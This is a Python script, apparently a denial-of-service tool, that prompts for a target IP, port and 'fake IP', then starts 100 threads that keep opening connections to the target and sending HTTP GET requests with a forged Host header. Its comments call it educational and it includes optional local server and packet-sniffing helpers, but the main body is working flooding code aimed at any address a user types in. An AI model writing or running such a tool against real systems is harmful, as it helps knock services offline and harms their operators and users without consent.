import socket
import threading
import logging
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Event

# Setup logging
logging.basicConfig(level=logging.INFO)

# Parameters
ip_addr = input("Enter target IP: ")  # Parameterized target IP
port = int(input("Enter target port: "))  # Parameterized target port
fk_ip = input("Enter fake IP: ")  # Parameterized fake IP
max_threads = 100  # Maximum threads for thread pool

# Graceful stop event
stop_event = Event()

# Function for handling each attack connection
def attack():
    while not stop_event.is_set():
        try:
            # Create socket connection with timeout
            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_connection.settimeout(5)  # Set timeout of 5 seconds
            
            # Connect to the target server
            socket_connection.connect((ip_addr, port))
            logging.info(f"Connected to {ip_addr}:{port}")
            
            # Send a fake request
            socket_connection.sendto(f"GET / HTTP/1.1\r\nHost: {fk_ip}\r\n\r\n".encode('ascii'), (ip_addr, port))
            
            # Sleep for a short period to simulate rate limiting (educational purpose)
            time.sleep(0.1)  # Sleep for 100ms between requests
            
        except socket.error as e:
            logging.error(f"Socket error: {e}")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
        finally:
            socket_connection.close()

# Function to gracefully shut down the threads
def stop_threads():
    logging.info("Stopping threads...")
    stop_event.set()

# Start attack threads using thread pool
def start_attack():
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # Submit tasks to the thread pool
        for _ in range(200):  # Submit 200 tasks
            executor.submit(attack)

# Run the attack
try:
    start_attack()

except KeyboardInterrupt:
    # Graceful shutdown on Ctrl+C
    stop_threads()
    logging.info("Attack stopped gracefully.")

# Optional: Simple HTTP server to simulate a server under attack (for testing)
def start_simple_server():
    from http.server import SimpleHTTPRequestHandler, HTTPServer

    server = HTTPServer(('localhost', 8080), SimpleHTTPRequestHandler)
    logging.info("Simple HTTP server started at http://localhost:8080")
    server.serve_forever()

# Optional: Packet analysis using scapy (for educational purposes)
def packet_analysis():
    from scapy.all import sniff

    def packet_callback(packet):
        logging.info(f"Packet captured: {packet.summary()}")

    sniff(prn=packet_callback, count=10)  # Capture 10 packets for analysis

# Uncomment below to test server or packet analysis:
# start_simple_server()
# packet_analysis()

